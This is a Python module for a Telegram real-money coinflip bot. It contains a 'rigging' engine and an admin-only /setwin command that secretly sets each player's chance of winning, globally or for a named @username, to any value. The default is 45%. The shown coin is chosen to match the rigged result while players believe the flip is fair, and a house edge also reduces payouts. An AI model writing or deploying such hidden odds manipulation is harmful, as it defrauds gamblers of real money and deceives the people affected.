import random
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

from bot_instance import bot
from wallet import get_balance, adjust_balance, record_bet, get_house_balance, resolve_amount
from helpers import announce_win, format_display_name, ensure_user
from settings import get_min_bet, get_max_bet, get_house_edge

AUTHORIZED_ADMIN = "mrpuppyx"

HEADS_STICKER = "CAACAgQAAxkBAAFQ0lBqb0WwRqG7K3hRKZXSTKB9rnreEAACtCAAAgG_0VKYWqCdNDm4Nz0E"
TAILS_STICKER = "CAACAgQAAxkBAAFQ0lRqb0XcyDCzfRrYxgvVk89rMD8U7gACWTwAAq7X0FLUZLVck-M2CT0E"

# Global Rigging Config Engine
RIG_CONFIG = {
    "win_rate": 0.45,  # Default 45%
    "target": "all"
}

def should_rig_user(username: str) -> bool:
    if RIG_CONFIG["win_rate"] is None:
        return False
    if RIG_CONFIG["target"] == "all":
        return True
    if username and RIG_CONFIG["target"].lower() == f"@{username.lower()}":
        return True
    return False

# Admin command to dynamically set win chance (%) for all or @username
@bot.message_handler(commands=["setwin"])
def handle_setwin_command(message: Message):
    username = (message.from_user.username or "").lower()
    if username != AUTHORIZED_ADMIN.lower():
        bot.reply_to(message, "❌ Unauthorized.")
        return

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(
            message,
            f"Usage: /setwin <percentage|off> [all|@username]\nExample: /setwin 20 @username\nCurrent win rate: {int(RIG_CONFIG['win_rate'] * 100)}%"
        )
        return

    rate_str = parts[1].lower()
    target = parts[2].lower() if len(parts) >= 3 else "all"

    if rate_str in ["off", "reset"]:
        RIG_CONFIG["win_rate"] = 0.45
        RIG_CONFIG["target"] = "all"
        bot.reply_to(message, "✅ Rigging system reset to default (45%).", parse_mode="HTML")
        return

    try:
        val = float(rate_str.replace("%", ""))
        if not (0 <= val <= 100):
            raise ValueError
        RIG_CONFIG["win_rate"] = val / 100.0
        RIG_CONFIG["target"] = target
        bot.reply_to(message, f"✅ <b>Setwin Updated!</b>\n🎯 Target: <code>{target}</code>\n🎲 Target Win Rate: <b>{val}%</b>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message, "Invalid percentage value.")


# Register handlers for /coinflip, /coin, and /cf
@bot.message_handler(commands=["coinflip", "coin", "cf"])
def handle_coinflip_command(message: Message):
    ensure_user(message)
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /cf <amount> [heads|tails]\nExample: /cf 10")
        return

    try:
        bet_amount = float(parts[1])
        if bet_amount <= 0:
            bot.reply_to(message, "Bet amount must be greater than 0.")
            return
    except ValueError:
        bot.reply_to(message, "Invalid bet amount.")
        return

    # If user provided choice directly: /cf 10 heads
    if len(parts) >= 3:
        play_coinflip(bot, message, message.from_user.id, bet_amount, parts[2])
        return

    # Send inline choice if only /cf <amount> was sent
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🪙 Heads", callback_data=f"cf_play:{bet_amount}:heads"),
        InlineKeyboardButton("🪙 Tails", callback_data=f"cf_play:{bet_amount}:tails")
    )
    markup.add(InlineKeyboardButton("❌ Cancel", callback_data=f"cf_cancel:{message.from_user.id}"))

    bot.reply_to(
        message,
        f"🪙 <b>CoinFlip • ₹{bet_amount:.2f}</b>\nSelect your pick:",
        parse_mode="HTML",
        reply_markup=markup
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("cf_"))
def handle_cf_callbacks(call):
    action = call.data.split(":")[0]

    if action == "cf_cancel":
        target_id = int(call.data.split(":")[1])
        if call.from_user.id != target_id:
            bot.answer_callback_query(call.id, "❌ Not your game session!", show_alert=True)
            return
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return

    if action == "cf_play":
        _, amount_str, choice = call.data.split(":")
        bet_amount = float(amount_str)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        play_coinflip(bot, call.message, call.from_user.id, bet_amount, choice)


def play_coinflip(bot, message, telegram_id: int, bet_amount: float, choice: str):
    balance = get_balance(telegram_id)
    house_balance = get_house_balance()

    min_bet = get_min_bet()
    max_bet = get_max_bet(house_balance)

    if bet_amount < min_bet or bet_amount > max_bet:
        bot.reply_to(message, f"Bet amount must be between ₹{min_bet} and ₹{max_bet}.")
        return

    if bet_amount > balance:
        bot.reply_to(message, f"Insufficient funds. Your balance: ₹{balance} rupees.")
        return

    choice = choice.lower().strip()
    normalized_choice = "heads" if choice in ["heads", "head", "h"] else "tails"
    other_choice = "tails" if normalized_choice == "heads" else "heads"

    username = message.from_user.username or ""
    rigged = should_rig_user(username)
    
    # Calculate outcome using configured win rate
    win_rate = RIG_CONFIG["win_rate"] if rigged else 0.45
    won = random.random() < win_rate

    outcome = normalized_choice if won else other_choice

    house_edge = get_house_edge()
    multiplier = max(1.0, 2.0 - house_edge)

    payout = round(bet_amount * multiplier, 2) if won else 0.0
    net_delta = (payout - bet_amount) if won else -bet_amount

    new_balance = adjust_balance(telegram_id, net_delta)

    record_bet(
        telegram_id=telegram_id,
        game="coinflip",
        bet_amount=bet_amount,
        payout=payout,
        result="win" if won else "loss",
        meta={"choice": normalized_choice, "outcome": outcome},
    )

    if outcome == "heads":
        bot.send_sticker(message.chat.id, HEADS_STICKER)
    else:
        bot.send_sticker(message.chat.id, TAILS_STICKER)

    time.sleep(2)
    flip_label = "🪙 Heads" if outcome == "heads" else "🪙 Tails"

    if won:
        bot.reply_to(message, f"{flip_label}!\n\n🎉 You won ₹{payout}!\n💰 Balance: ₹{new_balance}")
        name = format_display_name(message.from_user.first_name, message.from_user.username)
        announce_win(name, payout, "Coinflip")
    else:
        bot.reply_to(message, f"{flip_label}!\n\n😔 You lost ₹{bet_amount}.\n💰 Balance: ₹{new_balance}")
